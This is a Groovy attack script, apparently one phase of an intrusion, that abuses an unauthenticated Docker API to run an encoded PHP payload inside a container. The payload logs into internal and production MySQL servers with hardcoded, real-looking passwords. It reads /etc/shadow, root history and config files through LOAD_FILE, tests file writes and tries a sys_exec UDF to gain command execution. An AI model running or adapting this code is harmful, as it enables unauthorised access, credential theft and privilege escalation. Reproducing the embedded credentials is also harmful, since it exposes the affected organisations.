// Phase 6: CORRECT CREDS - Full priv enum + FILE + OUTFILE + pivot
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

echo "========================================\\n";
echo "PIVOT PHASE 6 — CORRECT CREDENTIALS\\n";
echo "========================================\\n\\n";

// =====================================================
// 1. DEV SEARS with correct password
// =====================================================
echo "===== [1] DEV SEARS: apifincadodev / 1q2w3e4r5t6y =====\\n";
$m = new mysqli("172.27.141.6", "apifincadodev", "1q2w3e4r5t6y", "tienda", 3308);
if ($m->connect_error) {
    echo "FAIL: ".$m->connect_error."\\n";
} else {
    echo "AUTH_OK\\n";
    
    // Version info
    $r = $m->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn, @@port pt, @@datadir dd, @@basedir bd, @@secure_file_priv sfp, @@plugin_dir pd, @@tmpdir td, @@system_time_zone tz");
    $row = $r->fetch_assoc();
    echo "VERSION: ".$row["v"]."\\n";
    echo "CURRENT_USER: ".$row["cu"]."\\n";
    echo "HOSTNAME: ".$row["hn"]."\\n";
    echo "PORT: ".$row["pt"]."\\n";
    echo "DATADIR: ".$row["dd"]."\\n";
    echo "BASEDIR: ".$row["bd"]."\\n";
    echo "SECURE_FILE_PRIV: |".$row["sfp"]."|\\n";
    echo "PLUGIN_DIR: ".$row["pd"]."\\n";
    echo "TMPDIR: ".$row["td"]."\\n";
    echo "TIMEZONE: ".$row["tz"]."\\n";
    
    // GRANTS
    echo "\\n--- GRANTS FOR CURRENT_USER ---\\n";
    $r = $m->query("SHOW GRANTS FOR CURRENT_USER()");
    while ($row = $r->fetch_row()) { echo $row[0]."\\n"; }
    
    // All privileges
    echo "\\n--- INFORMATION_SCHEMA.USER_PRIVILEGES ---\\n";
    $r = $m->query("SELECT * FROM information_schema.user_privileges WHERE GRANTEE LIKE \\'%apifincadodev%\\'");
    if ($r) { while ($row = $r->fetch_assoc()) { echo "  ".$row["GRANTEE"]." | ".$row["PRIVILEGE_TYPE"]." | ".$row["IS_GRANTABLE"]."\\n"; } }
    else { echo "  QUERY_ERR: ".$m->error."\\n"; }
    
    // All users (for ACL)
    echo "\\n--- MYSQL USERS (ACL hosts) ---\\n";
    $r = $m->query("SELECT user, host, plugin, authentication_string FROM mysql.user ORDER BY user");
    if ($r) { while ($row = $r->fetch_assoc()) { echo "  ".$row["user"]."@".$row["host"]." (".$row["plugin"].")\\n"; } }
    else { echo "  ".$m->error."\\n"; }
    
    // DATABASES
    echo "\\n--- DATABASES ---\\n";
    $r = $m->query("SHOW DATABASES");
    while ($row = $r->fetch_row()) { echo "  ".$row[0]."\\n"; }
    
    // =====================================================
    // 2. FILE PRIVILEGE TEST
    // =====================================================
    echo "\\n===== [2] FILE PRIVILEGE TEST =====\\n";
    $files = array(
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/etc/my.cnf", "/etc/mysql/my.cnf", "/var/lib/mysql/my.cnf",
        "/proc/1/cmdline", "/proc/net/tcp", "/proc/net/arp",
        "/root/.bash_history", "/root/.my.cnf",
        "/home/mysql/.my.cnf", "/var/log/mysqld.log"
    );
    foreach ($files as $f) {
        $r = $m->query("SELECT LOAD_FILE(\\'".$f."\\') AS c");
        $row = $r->fetch_assoc();
        if ($row["c"] !== null && strlen($row["c"]) > 0) {
            echo "FILE_OK|$f|".strlen($row["c"])." bytes\\n";
            $content = $row["c"];
            if (strlen($content) > 3000) $content = substr($content, 0, 3000)."\\n...[TRUNCATED]";
            echo $content."\\n---\\n";
        } else {
            echo "FILE_NULL|$f\\n";
        }
    }
    
    // =====================================================
    // 3. INTO OUTFILE TEST
    // =====================================================
    echo "\\n===== [3] INTO OUTFILE TEST =====\\n";
    $outpaths = array(
        "/tmp/tr4ns_pivot_test.txt",
        "/var/tmp/tr4ns_pivot_test.txt",
        "/var/lib/mysql/tr4ns_pivot_test.txt",
    );
    foreach ($outpaths as $op) {
        $r = $m->query("SELECT \\'PIVOT_RCE_TEST\\' INTO OUTFILE \\'".$op."\\'");
        if ($r) {
            echo "OUTFILE_OK|$op\\n";
        } else {
            echo "OUTFILE_FAIL|$op|".$m->error."\\n";
        }
    }
    
    // =====================================================
    // 4. UDF CHECK
    // =====================================================
    echo "\\n===== [4] UDF / FUNC TABLE =====\\n";
    $r = $m->query("SELECT * FROM mysql.func");
    if ($r && $r->num_rows > 0) {
        while ($row = $r->fetch_assoc()) { echo "  UDF: ".implode("|", $row)."\\n"; }
    } else {
        echo "  NO_UDF | err: ".$m->error."\\n";
    }
    
    // =====================================================
    // 5. PROCESS LIST (who else is connected)
    // =====================================================
    echo "\\n===== [5] PROCESSLIST =====\\n";
    $r = $m->query("SHOW PROCESSLIST");
    if ($r) { while ($row = $r->fetch_assoc()) { echo "  PID=".$row["Id"]." User=".$row["User"]." Host=".$row["Host"]." DB=".$row["db"]." Cmd=".$row["Command"]."\\n"; } }
    else { echo "  ".$m->error."\\n"; }
    
    // =====================================================
    // 6. SUPER/CREATE ROUTINE CHECK
    // =====================================================
    echo "\\n===== [6] PRIVILEGE ESCALATION CHECKS =====\\n";
    // Try CREATE FUNCTION (UDF)
    $m->query("CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so'");
    echo "CREATE UDF sys_exec: ".$m->error."\\n";
    
    // Try SYSTEM command via do_system (common UDF)
    $r = $m->query("SELECT sys_exec('id') as r");
    if ($r) { $row=$r->fetch_assoc(); echo "sys_exec(id)=".$row["r"]."\\n"; }
    else { echo "sys_exec: ".$m->error."\\n"; }
    
    $m->close();
}

// =====================================================
// 7. PROD SEARS with adaxxidb creds
// =====================================================
echo "\\n===== [7] PROD SEARS TESTS =====\\n";
$prod_tests = array(
    array("172.27.141.24", 3308, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("172.27.141.24", 3306, "apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("172.27.141.24", 3308, "adaxxidb", "JTQ6PrkecY3y1kVN"),
    array("172.27.141.24", 3306, "adaxxidb", "JTQ6PrkecY3y1kVN"),
    array("187.191.91.37", 3306, "adaxxidb", "JTQ6PrkecY3y1kVN"),
);
foreach ($prod_tests as $t) {
    list($host, $port, $user, $pass) = $t;
    $fp = @fsockopen($host, $port, $en, $es, 3);
    if (!$fp) {
        echo "TCP_FAIL|$host:$port|$en|$es\\n";
        continue;
    }
    fclose($fp);
    $m2 = @new mysqli($host, $user, $pass, "", $port);
    if ($m2->connect_error) {
        echo "AUTH_FAIL|$host:$port|$user|".$m2->connect_error."\\n";
    } else {
        echo "*** AUTH_OK ***|$host:$port|$user\\n";
        $r = $m2->query("SELECT VERSION(), CURRENT_USER(), @@hostname");
        $row = $r->fetch_row();
        echo "  VER=$row[0] CU=$row[1] HN=$row[2]\\n";
        $r = $m2->query("SHOW DATABASES");
        while ($row = $r->fetch_row()) { echo "  DB: $row[0]\\n"; }
        $m2->close();
    }
}

// =====================================================
// 8. T1PAGOS with various creds on correct port
// =====================================================
echo "\\n===== [8] T1PAGOS =====\\n";
$t1_tests = array(
    array("172.27.141.4", 3306, "app_t1", "wUt22Us2CUh#+M="),
    array("172.27.141.4", 3306, "apifincadodev", "1q2w3e4r5t6y"),
    array("172.27.141.4", 3306, "root", "1q2w3e4r5t6y"),
    array("172.27.141.4", 3306, "adaxxidb", "JTQ6PrkecY3y1kVN"),
);
foreach ($t1_tests as $t) {
    list($host, $port, $user, $pass) = $t;
    $m3 = @new mysqli($host, $user, $pass, "", $port);
    if ($m3->connect_error) {
        echo "AUTH_FAIL|$host:$port|$user|".$m3->connect_error."\\n";
    } else {
        echo "*** AUTH_OK ***|$host:$port|$user\\n";
        $r = $m3->query("SELECT VERSION(), CURRENT_USER(), @@hostname");
        $row = $r->fetch_row();
        echo "  VER=$row[0] CU=$row[1] HN=$row[2]\\n";
        $r = $m3->query("SHOW DATABASES");
        while ($row = $r->fetch_row()) { echo "  DB: $row[0]\\n"; }
        $r = $m3->query("SHOW GRANTS FOR CURRENT_USER()");
        while ($row = $r->fetch_row()) { echo "  GRANT: $row[0]\\n"; }
        $m3->close();
    }
}

echo "\\nPHASE6_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p6.php && php /tmp/_p6.php 2>&1; rm -f /tmp/_p6.php"

println "########## PHASE 6: FULL PIVOT WITH CORRECT CREDS ##########"
println execIn(cmd)
